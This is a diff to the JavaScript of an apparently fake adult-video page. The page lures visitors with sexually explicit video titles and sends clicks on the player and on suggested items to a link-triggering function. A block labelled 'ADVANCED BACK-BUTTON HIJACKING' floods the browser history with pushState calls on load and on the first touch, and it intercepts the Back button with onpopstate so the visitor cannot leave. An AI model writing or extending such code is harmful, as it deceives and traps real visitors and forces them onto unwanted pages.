@@ -176,7 +176,15 @@
             const videoPool = [
                 { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
                 { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
-                { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend', views: '3.1M', time: '09:12' }
+                { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend', views: '3.1M', time: '09:12' },
+                { src: 'IMG_0198.GIF', title: 'Exclusive Video Premiere Presentation', views: '2.5M', time: '10:14' },
+                { src: 'IMG_0199.GIF', title: 'Exclusive Video Premiere Presentation', views: '1.9M', time: '14:22' },
+                { src: 'IMG_0200.GIF', title: 'Exclusive Video Premiere Presentation', views: '3.4M', time: '11:05' },
+                { src: 'IMG_0201.GIF', title: 'Exclusive Video Premiere Presentation', views: '2.1M', time: '08:45' },
+                { src: 'IMG_0202.GIF', title: 'Exclusive Video Premiere Presentation', views: '1.6M', time: '13:50' },
+                { src: 'IMG_0203.GIF', title: 'Exclusive Video Premiere Presentation', views: '2.8M', time: '16:15' },
+                { src: 'IMG_0204.GIF', title: 'Exclusive Video Premiere Presentation', views: '3.0M', time: '12:30' },
+                { src: 'IMG_0205.GIF', title: 'Exclusive Video Premiere Presentation', views: '2.3M', time: '10:55' }
             ];
 
             const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
@@ -185,7 +193,7 @@
 
             let sidebarHtml = '';
             videoPool.forEach((item) => {
-                if(item.title !== mainVideo.title) {
+                if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
                     sidebarHtml += `
                     <div class="sidebar-item suggested-video-item">
                         <div class="thumb">
@@ -213,29 +221,27 @@
 
             document.getElementById('videoPlayer').addEventListener('click', triggerLinks);
 
-            const suggestedItems = document.querySelectorAll('.suggested-video-item');
-            suggestedItems.forEach(function(element) {
-                element.addEventListener('click', triggerLinks);
+            // Suggested items click logic (Event delegation handles dynamic elements)
+            document.getElementById('suggestedList').addEventListener('click', function(e) {
+                if(e.target.closest('.suggested-video-item')) {
+                    triggerLinks();
+                }
             });
 
             // ════════════════════════════════════════════════════════════
             // ADVANCED BACK-BUTTON HIJACKING
             // ════════════════════════════════════════════════════════════
             function setupHijack() {
-                // ব্রাউজারের হিস্ট্রি পুশ করার লুপ (ক্রোম ও মোবাইল ব্রাউজারের জন্য কার্যকর)
                 for (let i = 0; i < 10; i++) {
                     window.history.pushState(null, document.title, window.location.href);
                 }
             }
 
-            // প্রথম লোডেই হিস্ট্রি ব্লক করার চেষ্টা
             setupHijack();
 
-            // ইউজার পেজে যেকোনো জায়গায় টাচ বা ক্লিক করলেই ব্যাক লক হয়ে যাবে
             window.addEventListener('click', setupHijack, { once: true });
             window.addEventListener('touchstart', setupHijack, { once: true });
 
-            // ব্যাক বাটন চাপলে রিডাইরেক্ট ট্রিপল সিকিউরিটি দিয়ে করার চেষ্টা
             window.onpopstate = function (event) {
                 setupHijack();
                 setTimeout(function() {
